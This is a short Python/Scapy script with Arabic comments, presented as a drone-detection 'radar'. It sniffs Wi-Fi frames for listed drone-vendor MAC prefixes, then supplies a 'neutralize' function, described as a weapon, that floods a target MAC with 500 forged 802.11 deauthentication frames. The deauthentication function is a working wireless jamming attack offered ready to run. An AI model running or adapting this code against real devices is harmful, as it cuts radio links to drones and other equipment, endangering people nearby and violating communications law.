from scapy.all import *
import os

def tactical_radar_scan(interface="wlan0mon"):
    """
    رادار Aegis المطور: دمج الرصد العميق (10 ثوانٍ) مع تحليل كافة بصمات Dot11.
    المميزات: رصد الـ Beacon و Probe Requests لضمان كشف المسيرات المتخفية.
    """
    detected_drones = []
    # بصمات الشركات المصنعة المعتمدة (DJI, Parrot, Autel, etc.)
    drone_vendors = ["60:60:1f", "00:26:7e", "90:0e:b3", "00:12:1c"] 
    
    def packet_callback(pkt):
        if pkt.haslayer(Dot11):
            # addr2 هو مصدر الإشارة (المسيرة أو وحدة التحكم)
            mac_addr = pkt.addr2
            if mac_addr:
                prefix = mac_addr.lower()[:8]
                # التحقق من بصمة الشركة المصنعة
                if any(prefix.startswith(v) for v in drone_vendors):
                    detected_drones.append(mac_addr.upper())

    try:
        # البدء بالمسح العملياتي لمدة 10 ثوانٍ
        sniff(iface=interface, prn=packet_callback, timeout=10, store=0)
    except Exception as e:
        return f"⚠️ خطأ في العتاد: تأكد من وضع Monitor Mode على {interface}. التفاصيل: {e}"

    found = list(set(detected_drones))
    
    if not found:
        return "📡 المسح اكتمل: المجال الجوي نظيف، لا توجد بصمات معادية حالياً."
    
    return f"🚨 تقرير الرادار: تم رصد {len(found)} أهداف معادية: {', '.join(found)}"

def real_neutralize(target_mac, interface="wlan0mon"):
    """
    سلاح التحييد الإلكتروني: قطع الاتصال القسري (Deauth Attack)
    """
    dot11 = Dot11(addr1=target_mac, addr2="FF:FF:FF:FF:FF:FF", addr3=target_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    # إرسال موجة مكثفة لتعطيل الرابط
    sendp(packet, inter=0.001, count=500, iface=interface, verbose=0)
    return f"⚡ تم تنفيذ عملية التحييد ضد الهدف {target_mac} بنجاح."
